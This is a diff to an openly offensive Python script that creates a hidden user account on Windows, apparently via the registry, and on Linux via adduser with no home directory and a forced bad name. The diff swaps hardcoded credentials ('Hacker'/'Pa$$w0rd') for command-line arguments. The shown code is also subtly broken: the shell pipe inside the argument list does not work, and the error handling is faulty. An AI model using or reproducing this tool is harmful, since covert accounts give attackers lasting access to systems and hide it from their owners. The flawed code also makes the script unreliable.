@@ -1,10 +1,16 @@
-import os, subprocess, winreg
+import os, subprocess, winreg, argparse
 from winreg import *
 
 
-# Modify this
-username = 'Hacker'
-passwd = 'Pa$$w0rd'
+p = argparse.ArgumentParser(description="Create a hidden user !")
+p.add_argument("--uname", help="Username to create", metavar="", required=True, nargs=1)
+p.add_argument("--passwd", help="Password for the user", metavar="", required=True, nargs=1)
+args = p.parse_args()
+try:
+    username = args.uname[0]
+    passwd = args.passwd[0]
+except Exception as e:
+    print("Something went wrong, please try again.")
 
 
 # Windows function
@@ -27,14 +33,14 @@ def win():
 def lin():
     # Creates the user hidden as possible with no login and no home directory
     try:
-        p = subprocess.run(['echo', passwd, '|', 'openssl', 'passwd', '-1', '-stdin'],
-                           stdout=subprocess.PIPE).stdout.decode()
+        p = subprocess.run(['echo', passwd, '|', 'openssl', 'passwd', '-1', '-stdin'],stdout=subprocess.PIPE).stdout.decode()
         os.system(f"adduser --no-create-home --disabled-login --force-badname --quiet -s /bin/bash -p {p} {username}")
     except subprocess.SubprocessError or os.error:
         if subprocess.SubprocessError:
             print("Sorry, something went wrong with 'subprocess'")
         elif os.error:
             print("Sorry, something went wrong with 'os'")
+
 
 # Determine which Operation System and use correct function
 if __name__ == "__main__":
